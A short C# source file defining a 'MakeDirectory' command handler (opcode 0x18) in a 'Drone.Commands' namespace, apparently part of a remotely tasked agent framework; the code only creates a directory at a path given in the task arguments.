using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class MakeDirectory : DroneCommand
{
    public override byte Command => 0x18;
    public override bool Threaded => false;

    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        _ = Directory.CreateDirectory(task.Arguments["path"]);
        return Task.CompletedTask;
    }
}